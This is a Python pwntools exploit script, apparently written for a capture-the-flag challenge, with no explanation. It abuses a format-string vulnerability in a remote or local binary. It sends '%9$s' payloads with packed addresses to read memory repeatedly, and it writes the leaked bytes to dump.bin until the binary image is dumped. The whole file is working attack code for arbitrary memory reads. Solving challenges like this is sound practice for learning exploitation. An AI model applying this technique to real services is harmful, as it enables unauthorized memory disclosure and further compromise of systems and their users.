#!/usr/bin/python3
from pwn import *

"""
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
"""

r = True

f = open("dump.bin", "wb+")

dump = f.read()
sz = 0x3830

while len(dump) < sz:
    try:
        if r:
            p = remote("challs.xmas.htsp.ro", 2006) 
        else:
            p = process("./chall")

        def get_secret():
            p.sendlineafter("3. Exit.", "2")
            p.recvuntil("You took the gift and stored it safely at ")
            return int(p.recvline()[:-1], 16)

        def do_fmt(fmt):
            p.sendlineafter("3. Exit.", "1")
            p.sendlineafter("?", fmt)
            
        def do_read(addr):
            do_fmt(b"%9$sBBBB" + p64(addr))
            p.recvuntil("You left the following message: ")
            return p.recvuntil("BBBB")[:-4]

        secret = get_secret()
        log.info(f"secret: 0x{secret:02x}")
        try:
            asdf = do_read(secret + len(dump))
        except:
            p.close()
            continue

        f.write(asdf + b"\x00")
        f.flush()
        dump += asdf + b"\x00"

        print(hexdump(dump))
        p.close()
    except:
        continue